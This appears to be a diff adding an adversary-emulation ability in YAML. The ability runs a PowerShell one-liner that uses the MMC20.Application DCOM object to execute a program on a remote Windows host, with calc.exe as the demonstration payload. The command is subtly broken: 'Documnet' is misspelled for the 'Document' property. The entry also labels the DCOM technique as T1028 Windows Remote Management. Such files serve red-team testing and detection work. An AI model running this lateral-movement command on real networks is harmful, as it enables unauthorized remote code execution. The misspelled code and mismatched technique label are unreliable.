@@ -1,0 +1,14 @@
+---
+
+- id: tacmulti-1028-AR01-1v00-200120184608
+  name: PowerShell Lateral Movement
+  description: .      Powershell lateral movement using the mmc20 application com object.  .      Reference:.  .      https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/.  
+  tactic: multiple
+  technique:
+    attack_id: T1028
+    name: Windows Remote Management
+  platforms:
+    windows:
+      cmd:
+        command: |
+          powershell.exe [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","computer1")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
